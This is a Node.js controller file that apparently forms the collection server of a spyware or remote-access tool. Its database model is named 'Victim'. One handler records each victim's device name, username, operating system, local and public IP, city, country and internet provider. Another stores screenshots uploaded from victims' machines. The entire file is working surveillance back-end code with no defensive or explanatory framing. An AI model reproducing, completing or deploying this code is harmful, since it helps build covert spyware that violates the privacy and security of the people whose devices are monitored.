const Victim = require("../models/Victim");
const path = require("path");

const sharp = require("sharp");

const crypto = require("crypto");

class CollectController {
    async send(req, res) {
        try {
            const { identificator, devicename, username, os, local_ip, public_ip, city, country, provider } = req.body;
            
            const condidate = await Victim.findOne({ identificator });

            if (!condidate) {
                const user = await Victim.create({ identificator, devicename, username, os, local_ip, public_ip, city, country, provider });
                user.save();
                return res.status(200).json({ message: "CREATED" });
            }
            
            condidate.devicename = devicename;
            condidate.username = username;
            condidate.os = os;
            condidate.local_ip = local_ip;
            condidate.public_ip = public_ip;
            condidate.city = city;
            condidate.country = country;
            condidate.provider = provider;
            condidate.timestampUpdate = Date.now();
            
            condidate.save();
            return res.status(200).json({ message: "UPDATED" });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }

    async screen(req, res) {
        try {
            if(!req.files) return res.status(400).json({ message: "NO_FILES_FOUND" });

            const image = req.files.image;

            const { identificator} = req.body;

            const imageName = crypto.createHash("md5").update(Date.now().toString()).digest("hex") + "_" + identificator + ".webp";

            const savePath = path.join(__dirname, "../../static/", imageName);

            await sharp(image.data).webp({ quality: 25 }).toFile(savePath);

            const user = await Victim.findOne({ identificator });

            if (!user) return res.status(400).json({ message: "USER_NOT_FOUND" });

            user.screenshots.push(imageName);
            user.save();

            res.status(200).json({ message: "OK" });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }
}

module.exports = new CollectController();